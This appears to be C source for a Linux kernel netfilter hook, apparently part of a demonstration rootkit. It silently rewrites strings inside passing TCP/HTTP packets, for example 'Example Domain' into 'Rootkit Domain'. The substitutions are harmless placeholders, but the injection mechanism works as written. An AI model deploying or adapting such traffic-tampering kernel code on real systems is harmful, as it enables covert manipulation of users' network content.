#include <linux/net.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "http_injector.h"
#include "fast_search.h"

/*
 * Replace "Hello world" in HTTP request by "Malicious"
 */

static int replace(struct sk_buff *skb, unsigned char *data, unsigned char *tail, search_map_t *map) {
    unsigned char *i;
    long diff;

    search_list_item_t *search_list = init_search_list(map);
    search_list_item_t *result;
    item_t *item;

    if (tail == data) {
        return 0;
    }
    for (i = data; i < tail; ++i) {
        result = update_search_list(map, search_list, *i, (char *)i);
        // Result can be a chain but we take only the first item
        if (result != NULL) {
            item = result->item_location;
            diff = item->key_length - item->value_length;
            if (diff == 0) {
                memcpy(result->head, item->value, item->key_length);
            }
            else if (diff > 0) {
                memcpy(result->head, item->value, item->value_length);
                memcpy(result->head + item->value_length, result->head + item->key_length, tail-i-diff);
                tail -= diff;
                memset((void *)(tail-1), ' ', diff);
                
                skb_trim(skb, tail-skb->head);
                
                i -= diff;
            }
        }
    }
    
    free_search_list(search_list);
    return 0;
}

int fill_search_dict(search_map_t *map) {
    add_item_to_map(map, "Hello world",  11, "Holle Lord",  10);
    add_item_to_map(map, "Example Domain",  14, "Rootkit Domain",  14);
    add_item_to_map(map, "1234",   4, "56",   2);
    return 0;
}

unsigned int http_nf_hookfn(void *priv,
                            struct sk_buff *skb,
                            const struct nf_hook_state *state)
{    
    (void)state;

    unsigned char *user_data;   /* TCP data begin pointer */
    unsigned char *tail;        /* TCP data end pointer */

    struct iphdr  *iph = ip_hdr(skb);
    struct tcphdr *tcph;

    search_map_t *map = (search_map_t *)priv;

    if (iph->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }
    tcph = tcp_hdr(skb);

    user_data = (unsigned char *)((unsigned char *)tcph + (tcph->doff * 4));
    tail = skb_tail_pointer(skb);
    
    // Not working with fragmentation
    // if (memcmp(user_data, "HTTP/1.0 200 OK", 15) != 0) {
    //     return NF_ACCEPT;
    // }

    if (isalnum(*user_data) == 0) {
        return NF_ACCEPT;
    }

    replace(skb, user_data, tail, map);

    return NF_ACCEPT;
}